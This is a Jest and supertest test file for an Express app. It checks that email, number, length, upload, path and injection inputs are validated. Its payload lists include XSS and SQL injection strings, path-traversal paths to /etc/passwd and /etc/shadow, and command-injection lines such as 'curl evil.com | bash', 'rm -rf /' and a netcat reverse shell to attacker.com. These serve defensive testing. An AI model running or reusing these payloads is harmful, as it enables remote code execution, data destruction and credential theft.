const request = require('supertest');
const express = require('express');
const { body, param, query, validationResult } = require('express-validator');

describe('Input Validation Security Tests', () => {
  let app;

  beforeEach(() => {
    app = express();
    app.use(express.json({ limit: '10mb' }));
    app.use(express.urlencoded({ extended: true, limit: '10mb' }));

    // Validation middleware
    const handleValidationErrors = (req, res, next) => {
      const errors = validationResult(req);
      if (!errors.isEmpty()) {
        return res.status(400).json({
          error: 'Validation failed',
          details: errors.array(),
        });
      }
      next();
    };

    // Mock endpoints with validation
    app.post(
      '/api/test/user',
      [
        body('email').isEmail().normalizeEmail(),
        body('age').isInt({ min: 13, max: 150 }),
        body('name').isLength({ min: 2, max: 50 }).trim().escape(),
        body('phone')
          .optional()
          .matches(/^\+?[\d\s\-\(\)]{10,15}$/),
        body('website').optional().isURL(),
      ],
      handleValidationErrors,
      (req, res) => {
        res.json({
          success: true,
          user: req.body,
        });
      }
    );

    app.get(
      '/api/test/search',
      [
        query('q').isLength({ min: 1, max: 100 }).trim().escape(),
        query('page').optional().isInt({ min: 1, max: 1000 }),
        query('limit').optional().isInt({ min: 1, max: 100 }),
        query('sort').optional().isIn(['name', 'date', 'relevance']),
      ],
      handleValidationErrors,
      (req, res) => {
        res.json({
          success: true,
          query: req.query.q,
          page: parseInt(req.query.page) || 1,
          limit: parseInt(req.query.limit) || 10,
        });
      }
    );

    app.get(
      '/api/test/file/:filename',
      [param('filename').matches(/^[a-zA-Z0-9_\-\.]{1,255}$/)],
      handleValidationErrors,
      (req, res) => {
        res.json({
          success: true,
          filename: req.params.filename,
        });
      }
    );

    app.post(
      '/api/test/upload',
      [
        body('title').isLength({ min: 1, max: 200 }).trim().escape(),
        body('content').isLength({ min: 1, max: 10000 }).trim(),
        body('tags').optional().isArray({ max: 10 }),
        body('tags.*').optional().isLength({ min: 1, max: 50 }).trim().escape(),
        body('metadata.category').optional().isIn(['tech', 'business', 'personal']),
        body('metadata.priority').optional().isInt({ min: 1, max: 5 }),
      ],
      handleValidationErrors,
      (req, res) => {
        res.json({
          success: true,
          data: req.body,
        });
      }
    );

    // Endpoint vulnerable to command injection (for testing)
    app.post('/api/test/vulnerable-command', (req, res) => {
      const { command } = req.body;

      // This would be vulnerable in real code
      if (command && typeof command === 'string') {
        // Simulate command execution (don't actually execute)
        if (command.includes(';') || command.includes('|') || command.includes('&')) {
          return res.status(400).json({
            error: 'Invalid command format',
          });
        }
      }

      res.json({
        success: true,
        command: command,
      });
    });

    // File upload simulation
    app.post('/api/test/file-upload', (req, res) => {
      const { filename, content } = req.body;

      // Validate file extension
      const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.pdf', '.txt'];
      const extension = filename ? filename.toLowerCase().substring(filename.lastIndexOf('.')) : '';

      if (!allowedExtensions.includes(extension)) {
        return res.status(400).json({
          error: 'File type not allowed',
          allowed: allowedExtensions,
        });
      }

      // Validate file size (simulated)
      if (content && content.length > 1000000) {
        // 1MB limit
        return res.status(400).json({
          error: 'File size too large',
          maxSize: '1MB',
        });
      }

      res.json({
        success: true,
        filename: filename,
        size: content ? content.length : 0,
      });
    });
  });

  describe('Email Validation', () => {
    test('should accept valid email addresses', async () => {
      const validEmails = [
        'user@example.com',
        'test.user+tag@example.co.uk',
        'user123@test-domain.org',
      ];

      for (const email of validEmails) {
        const response = await request(app)
          .post('/api/test/user')
          .send({
            email: email,
            age: 25,
            name: 'Test User',
          })
          .expect(200);

        expect(response.body.success).toBe(true);
      }
    });

    test('should reject invalid email addresses', async () => {
      const invalidEmails = [
        'invalid-email',
        '@example.com',
        'user@',
        'user..user@example.com',
        'user@.example.com',
        'user@example.',
        '<script>alert("xss")</script>@example.com',
      ];

      for (const email of invalidEmails) {
        const response = await request(app)
          .post('/api/test/user')
          .send({
            email: email,
            age: 25,
            name: 'Test User',
          })
          .expect(400);

        expect(response.body.error).toBe('Validation failed');
      }
    });
  });

  describe('Numeric Validation', () => {
    test('should accept valid age values', async () => {
      const validAges = [13, 25, 65, 150];

      for (const age of validAges) {
        const response = await request(app)
          .post('/api/test/user')
          .send({
            email: 'test@example.com',
            age: age,
            name: 'Test User',
          })
          .expect(200);

        expect(response.body.success).toBe(true);
      }
    });

    test('should reject invalid age values', async () => {
      const invalidAges = [
        12, // Too young
        151, // Too old
        -5, // Negative
        'abc', // Not a number
        null, // Null value
        3.14, // Float
      ];

      for (const age of invalidAges) {
        const response = await request(app)
          .post('/api/test/user')
          .send({
            email: 'test@example.com',
            age: age,
            name: 'Test User',
          })
          .expect(400);

        expect(response.body.error).toBe('Validation failed');
      }
    });

    test('should validate query parameters', async () => {
      // Valid parameters
      await request(app)
        .get('/api/test/search')
        .query({ q: 'test', page: 1, limit: 10 })
        .expect(200);

      // Invalid page number
      await request(app).get('/api/test/search').query({ q: 'test', page: 0 }).expect(400);

      // Invalid limit
      await request(app).get('/api/test/search').query({ q: 'test', limit: 200 }).expect(400);
    });
  });

  describe('String Length Validation', () => {
    test('should reject strings that are too short', async () => {
      const response = await request(app)
        .post('/api/test/user')
        .send({
          email: 'test@example.com',
          age: 25,
          name: 'A', // Too short (minimum 2 characters)
        })
        .expect(400);

      expect(response.body.error).toBe('Validation failed');
    });

    test('should reject strings that are too long', async () => {
      const longName = 'A'.repeat(51); // Too long (maximum 50 characters)

      const response = await request(app)
        .post('/api/test/user')
        .send({
          email: 'test@example.com',
          age: 25,
          name: longName,
        })
        .expect(400);

      expect(response.body.error).toBe('Validation failed');
    });

    test('should validate query string length', async () => {
      const longQuery = 'A'.repeat(101); // Too long (maximum 100 characters)

      const response = await request(app)
        .get('/api/test/search')
        .query({ q: longQuery })
        .expect(400);

      expect(response.body.error).toBe('Validation failed');
    });
  });

  describe('XSS Prevention in Input Validation', () => {
    test('should escape HTML entities in user input', async () => {
      const xssAttempts = [
        '<script>alert("xss")</script>',
        '"><script>alert("xss")</script>',
        'javascript:alert("xss")',
        '<img src="x" onerror="alert(\'xss\')">',
      ];

      for (const xssPayload of xssAttempts) {
        const response = await request(app)
          .post('/api/test/user')
          .send({
            email: 'test@example.com',
            age: 25,
            name: xssPayload,
          })
          .expect(200);

        // Name should be escaped
        expect(response.body.user.name).not.toContain('<script>');
        expect(response.body.user.name).not.toContain('javascript:');
      }
    });

    test('should sanitize search queries', async () => {
      const response = await request(app)
        .get('/api/test/search')
        .query({ q: '<script>alert("xss")</script>' })
        .expect(200);

      expect(response.body.query).not.toContain('<script>');
    });
  });

  describe('SQL Injection Prevention in Input Validation', () => {
    test('should reject SQL injection attempts in names', async () => {
      const sqlInjectionAttempts = [
        "'; DROP TABLE users; --",
        "' OR '1'='1' --",
        "' UNION SELECT * FROM passwords --",
        "admin'--",
        "' OR 1=1#",
      ];

      for (const payload of sqlInjectionAttempts) {
        const response = await request(app)
          .post('/api/test/user')
          .send({
            email: 'test@example.com',
            age: 25,
            name: payload,
          })
          .expect(200);

        // Should be escaped/sanitized
        expect(response.body.success).toBe(true);
        expect(response.body.user.name).not.toContain('DROP TABLE');
      }
    });

    test('should validate search queries against SQL injection', async () => {
      const response = await request(app)
        .get('/api/test/search')
        .query({ q: "'; DROP TABLE users; --" })
        .expect(200);

      expect(response.body.query).not.toContain('DROP TABLE');
    });
  });

  describe('Command Injection Prevention', () => {
    test('should detect command injection attempts', async () => {
      const commandInjectionAttempts = [
        'ls; rm -rf /',
        'ping google.com && rm file.txt',
        'curl evil.com | bash',
        'cat /etc/passwd',
        '$(whoami)',
        '`id`',
        '; nc -e /bin/bash attacker.com 4444',
      ];

      for (const payload of commandInjectionAttempts) {
        const response = await request(app)
          .post('/api/test/vulnerable-command')
          .send({ command: payload })
          .expect(400);

        expect(response.body.error).toBe('Invalid command format');
      }
    });

    test('should allow safe commands', async () => {
      const safeCommands = ['ls', 'pwd', 'date', 'echo hello'];

      for (const command of safeCommands) {
        const response = await request(app)
          .post('/api/test/vulnerable-command')
          .send({ command: command })
          .expect(200);

        expect(response.body.success).toBe(true);
      }
    });
  });

  describe('File Upload Validation', () => {
    test('should accept allowed file types', async () => {
      const allowedFiles = ['document.pdf', 'image.jpg', 'photo.PNG', 'text.txt'];

      for (const filename of allowedFiles) {
        const response = await request(app)
          .post('/api/test/file-upload')
          .send({
            filename: filename,
            content: 'valid file content',
          })
          .expect(200);

        expect(response.body.success).toBe(true);
      }
    });

    test('should reject dangerous file types', async () => {
      const dangerousFiles = [
        'script.js',
        'malware.exe',
        'virus.bat',
        'shell.sh',
        'backdoor.php',
        'payload.html',
        'config.xml',
      ];

      for (const filename of dangerousFiles) {
        const response = await request(app)
          .post('/api/test/file-upload')
          .send({
            filename: filename,
            content: 'malicious content',
          })
          .expect(400);

        expect(response.body.error).toBe('File type not allowed');
      }
    });

    test('should reject files that are too large', async () => {
      const largeContent = 'A'.repeat(1000001); // Over 1MB

      const response = await request(app)
        .post('/api/test/file-upload')
        .send({
          filename: 'large.txt',
          content: largeContent,
        })
        .expect(400);

      expect(response.body.error).toBe('File size too large');
    });
  });

  describe('Path Traversal Prevention', () => {
    test('should reject path traversal attempts in filename parameter', async () => {
      const pathTraversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32\\config\\sam',
        '/etc/shadow',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        '....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      ];

      for (const filename of pathTraversalAttempts) {
        const response = await request(app)
          .get(`/api/test/file/${encodeURIComponent(filename)}`)
          .expect(400);

        expect(response.body.error).toBe('Validation failed');
      }
    });

    test('should accept valid filenames', async () => {
      const validFilenames = ['document.pdf', 'my-file.txt', 'file_123.jpg', 'report-2023.xlsx'];

      for (const filename of validFilenames) {
        const response = await request(app).get(`/api/test/file/${filename}`).expect(200);

        expect(response.body.success).toBe(true);
        expect(response.body.filename).toBe(filename);
      }
    });
  });

  describe('Array and Object Validation', () => {
    test('should validate array inputs', async () => {
      // Valid array
      const response1 = await request(app)
        .post('/api/test/upload')
        .send({
          title: 'Test Post',
          content: 'This is test content',
          tags: ['tech', 'tutorial', 'javascript'],
        })
        .expect(200);

      expect(response1.body.success).toBe(true);

      // Too many tags
      const response2 = await request(app)
        .post('/api/test/upload')
        .send({
          title: 'Test Post',
          content: 'This is test content',
          tags: Array(11).fill('tag'), // 11 tags, max is 10
        })
        .expect(400);

      expect(response2.body.error).toBe('Validation failed');
    });

    test('should validate nested object properties', async () => {
      // Valid metadata
      const response1 = await request(app)
        .post('/api/test/upload')
        .send({
          title: 'Test Post',
          content: 'This is test content',
          metadata: {
            category: 'tech',
            priority: 3,
          },
        })
        .expect(200);

      expect(response1.body.success).toBe(true);

      // Invalid category
      const response2 = await request(app)
        .post('/api/test/upload')
        .send({
          title: 'Test Post',
          content: 'This is test content',
          metadata: {
            category: 'invalid-category',
            priority: 3,
          },
        })
        .expect(400);

      expect(response2.body.error).toBe('Validation failed');
    });
  });

  describe('Edge Cases and Boundary Testing', () => {
    test('should handle null and undefined values', async () => {
      const response = await request(app)
        .post('/api/test/user')
        .send({
          email: null,
          age: undefined,
          name: 'Test User',
        })
        .expect(400);

      expect(response.body.error).toBe('Validation failed');
    });

    test('should handle empty strings', async () => {
      const response = await request(app)
        .post('/api/test/user')
        .send({
          email: '',
          age: 25,
          name: '',
        })
        .expect(400);

      expect(response.body.error).toBe('Validation failed');
    });

    test('should handle very large JSON payloads', async () => {
      const largeObject = {
        email: 'test@example.com',
        age: 25,
        name: 'Test User',
        data: 'A'.repeat(15 * 1024 * 1024), // 15MB of data (over 10MB limit)
      };

      // This should be rejected by the body parser limit
      const response = await request(app).post('/api/test/user').send(largeObject).expect(413); // Payload Too Large

      expect(response.status).toBe(413);
    });

    test('should handle malformed JSON', async () => {
      const response = await request(app)
        .post('/api/test/user')
        .set('Content-Type', 'application/json')
        .send('{"email": "test@example.com", "age": 25, "name":}') // Malformed JSON
        .expect(400);

      expect(response.status).toBe(400);
    });
  });
});
